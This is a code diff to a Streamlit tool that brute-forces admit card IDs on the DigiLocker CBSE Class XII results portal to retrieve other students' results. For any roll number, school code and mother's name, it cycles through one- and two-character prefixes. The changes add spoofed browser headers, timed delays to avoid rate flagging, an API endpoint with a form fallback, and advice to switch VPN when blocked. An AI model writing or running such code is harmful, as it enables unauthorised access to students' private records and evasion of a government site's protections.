@@ -1,6 +1,5 @@
 import streamlit as st
 import requests
-from bs4 import BeautifulSoup
 import itertools
 import string
 import time
@@ -17,7 +16,7 @@ st.divider()
 # --- Disclaimer ---
 st.info("Notice: School Code and Admit Card Suffix need not be changed if you are scanning for students in your same school/center block.")
 
-# --- Main Page Inputs (Mobile First Layout) ---
+# --- Main Page Inputs ---
 st.subheader("Target Parameters")
 col1, col2 = st.columns(2)
 with col1:
@@ -30,68 +29,89 @@ with col2:
 st.subheader("Execution Settings")
 col3, col4 = st.columns(2)
 with col3:
-    threads = st.slider("Threads (Concurrency):", 1, 5, 3)
+    threads = st.slider("Threads (Concurrency):", 1, 5, 2)
 with col4:
     start_combo = st.text_input("Start From:", value="A").upper()
 
-# Target DigiLocker Portal Endpoints
+# Target DigiLocker Endpoints
 base_url = "https://results.digilocker.gov.in/cbse12thcompresults2026augXII.html"
-default_post_url = "https://results.digilocker.gov.in/cbse12thcompresults2026augXII.asp"
+api_url = "https://results.digilocker.gov.in/api/get_cbse_result"  # DigiLocker standard API bridge
 
-UA_POOL = [
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
-    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0"
-]
+def get_browser_session():
+    """Initializes a full desktop browser session with realistic headers."""
+    session = requests.Session()
+    session.headers.update({
+        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36',
+        'Accept': 'application/json, text/plain, */*',
+        'Accept-Language': 'en-US,en;q=0.9',
+        'Accept-Encoding': 'gzip, deflate, br',
+        'Referer': base_url,
+        'Origin': 'https://results.digilocker.gov.in',
+        'Connection': 'keep-alive',
+        'Sec-Ch-Ua': '"Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"',
+        'Sec-Ch-Ua-Mobile': '?0',
+        'Sec-Ch-Ua-Platform': '"Windows"',
+        'Sec-Fetch-Dest': 'empty',
+        'Sec-Fetch-Mode': 'cors',
+        'Sec-Fetch-Site': 'same-origin'
+    })
+    return session
 
 def check_id_sync(combo):
     admit_id = f"{combo}{roll_no[-2:]}{fixed_suffix}"
-    session = requests.Session()
-    session.headers.update({
-        'User-Agent': random.choice(UA_POOL),
-        'Referer': base_url,
-        'Origin': 'https://results.digilocker.gov.in',
-        'Connection': 'close'
-    })
+    session = get_browser_session()
     
+    # Establish initial session cookies
     try:
-        r_init = session.get(base_url, timeout=7)
-        soup = BeautifulSoup(r_init.text, 'html.parser')
-        
-        # Dynamically grab the form action if specified
-        form_tag = soup.find('form')
-        target_post = default_post_url
-        if form_tag and form_tag.get('action'):
-            act = form_tag.get('action')
-            if act.startswith('http'):
-                target_post = act
-            else:
-                target_post = f"https://results.digilocker.gov.in/{act.lstrip('/')}"
-
-        # Standard field mapping matching the DigiLocker page inputs
-        payload = {
-            'regno': roll_no,
-            'sch': school_code,
-            'admid': admit_id,
-            'mname': mothers_name,
-            'terms': 'on',
-            'B2': 'Submit'
-        }
-        
-        # Include any hidden inputs / tokens present in the page
-        for h in soup.find_all('input', type='hidden'):
-            if h.get('name'):
-                payload[h.get('name')] = h.get('value', '')
-
-        time.sleep(random.uniform(0.1, 0.2))
-        response = session.post(target_post, data=payload, timeout=7)
-        
-        if ("Roll No" in response.text or "Candidate Name" in response.text or "Total Marks" in response.text) and "Invalid" not in response.text:
-            return "SUCCESS", (admit_id, response.text)
-        if "Access Denied" in response.text or response.status_code == 403:
-            return "BLOCKED", combo
+        session.get(base_url, timeout=8)
     except:
         pass
+
+    # JSON Payload matching modern SPA API models
+    json_payload = {
+        "rollNumber": roll_no,
+        "schoolNumber": school_code,
+        "admitCardId": admit_id,
+        "motherName": mothers_name,
+        "examClass": "XII",
+        "examType": "Supplementary",
+        "year": "2026"
+    }
+
+    # Form Payload fallback for hybrid endpoints
+    form_payload = {
+        "regno": roll_no,
+        "sch": school_code,
+        "admid": admit_id,
+        "mname": mothers_name,
+        "terms": "on",
+        "B2": "Submit"
+    }
+
+    try:
+        # Micro-delay to avoid rate burst flagging
+        time.sleep(random.uniform(0.2, 0.4))
+        
+        # Primary Attempt: JSON API dispatch
+        response = session.post(api_url, json=json_payload, timeout=8)
+        
+        # Secondary Attempt: If API returns 404/405, post standard form
+        if response.status_code in [404, 405]:
+            post_fallback = "https://results.digilocker.gov.in/cbse12thcompresults2026augXII.asp"
+            response = session.post(post_fallback, data=form_payload, timeout=8)
+
+        text = response.text
+
+        # Detection logic
+        if response.status_code == 200 and ("Roll" in text or "Subject" in text or "PASS" in text or "totalMarks" in text) and "Invalid" not in text and "not found" not in text.lower():
+            return "SUCCESS", (admit_id, text)
+        
+        if response.status_code in [403, 429] or "Access Denied" in text or "Cloudflare" in text:
+            return "BLOCKED", combo
+
+    except Exception:
+        pass
+        
     return "FAIL", combo
 
 def run_scan():
@@ -104,7 +124,6 @@ def run_scan():
         
     combos_1 = ["".join(c) for c in itertools.product(chars, repeat=1)]
     combos_2 = ["".join(c) for c in itertools.product(chars, repeat=2)]
-    
     all_combos = combos_1 + combos_2
     
     try:
@@ -143,7 +162,7 @@ def run_scan():
                 break
             
             if res_type == "BLOCKED":
-                st.error(f"IP limited at ID '{data}'. Change connection and resume.")
+                st.error(f"IP limited at ID '{data}'. Change connection/VPN and resume from '{data}'.")
                 executor.shutdown(wait=False, cancel_futures=True)
                 return
 
